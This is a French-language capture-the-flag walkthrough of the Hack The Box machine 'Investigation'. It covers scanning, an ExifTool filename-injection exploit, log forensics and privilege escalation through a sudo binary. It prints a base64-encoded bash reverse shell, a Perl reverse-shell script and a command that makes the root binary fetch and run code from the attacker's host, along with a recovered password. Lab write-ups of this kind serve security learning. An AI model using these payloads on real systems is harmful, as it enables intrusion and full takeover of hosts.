# Investigation - Medium

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-26 19:47 EST
Nmap scan report for 10.10.11.197
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:1e:63:06:aa:6e:bb:cc:0d:19:d4:15:26:74:c6:d9 (RSA)
|   256 27:45:20:ad:d2:fa:a7:3a:83:73:d9:7c:79:ab:f3:0b (ECDSA)
|_  256 42:45:eb:91:6e:21:02:06:17:b2:74:8b:c5:83:4f:e0 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://eforenzics.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On est redirigé vers eforenzics.htb. On l’ajoute donc dans notre /etc/hosts

On lance un gobuster en tâche de fond. Rien de particulier dans le code source du site, il y a cependant une page pour upload des images jpg. On va intercepter la requête d’upload avec burp pour l’analyser, elle envoie une requête à la page upload.php. C’est juste l’image en raw.

Résultats gobuster:

```bash
/assets               (Status: 301) [Size: 317] [--> http://eforenzics.htb/assets/]
/server-status        (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10957]
/.htaccess            (Status: 403) [Size: 279]  
/.                    (Status: 200) [Size: 10957]
/upload.php           (Status: 200) [Size: 3773] 
/.html                (Status: 403) [Size: 279]  
/.php                 (Status: 403) [Size: 279]  
/.htpasswd            (Status: 403) [Size: 279]  
/service.html         (Status: 200) [Size: 4335] 
/.htm                 (Status: 403) [Size: 279]  
/.htpasswds           (Status: 403) [Size: 279]  
/.htgroup             (Status: 403) [Size: 279]  
/wp-forum.phps        (Status: 403) [Size: 279]  
/.htaccess.bak        (Status: 403) [Size: 279]  
/.htuser              (Status: 403) [Size: 279]  
/.ht                  (Status: 403) [Size: 279]  
/.htc                 (Status: 403) [Size: 279]  
/.htaccess.old        (Status: 403) [Size: 279]  
/.htacess             (Status: 403) [Size: 279]
```

Une fois upload le site analyse l’image avec ExifTool Version Number : 12.37. On recherche donc une vulnérabilité:

[https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)

On va envoyer un image et l’intercepter pour changer le nom pour faire une reverse shell. Les “/” et toute autre caractère système est coupé donc on passe en base 64 puis en décode pour executer.

Voici le payload:

```bash
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzkwOTAgMD4mMQ==' | base64 -d | bash |
```

On est connecté en tant que www-data, apparemment les commandes utilisent perl, rien de particulier dans les fichiers du serveur. On va lance linpeas pour essayer de trouver des choses intéressantes:

```bash
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group www-data:
/usr/local/investigation/analysed_log
```

On trouve alors un fichier .msg qui est un mail, on utilise ceci pour l’ouvrir et on le télécharge sur notre machine: [https://products.aspose.app/email/viewer/msg](https://products.aspose.app/email/viewer/msg)

On peut obtenir la pièce jointe: [https://www.encryptomatic.com/viewer/](https://www.encryptomatic.com/viewer/)

On obtient un fichier .evtx

On se sert de ce script: https://github.com/williballenthin/python-evtx

Et on obtient un très grand fichier, quand on le cherche par hasard on tombe sur le mot de passe de smorton dans le champ TargetUserName: 

```bash
<Data Name="TargetUserName">Def@ultf0r3nz!csPa$$</Data>
```

On obtient donc le flag user.

Réflexe:

```bash
sudo -l

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

On extrait donc le binaire avec un serveur python et on l’analyse avec ghidra.

On peut lire que s’il n’y a pas 3 arguments et que le script est pas lancé par root le script s’arrête. Il faut aussi que un strcmp retourne 0 et donc qu’on renseigne la bonne chaîne de caractère, un peu comme un mot de passe : lDnxUysaQn. Le code fait ensuite un curl avec l’argument du’on lui donne en 2éme position. On va donc essayer de télécharger un reverse shell en perl (c’est ce qui est utilisé pour lancer le script obtenu)

```bash
sudo /usr/bin/binary test lDnxUysaQn
Running... 
Exiting...
```

```perl
use Socket;
$i = "10.0.0.1";
$p = 4242;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if (connect(S, sockaddr_in($p, inet_aton($i)))) {
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/sh -i");
};

```

```bash
sudo /usr/bin/binary http://10.10.16.6:8000/shell.pl lDnxUysaQn
```

On obtient un shell root !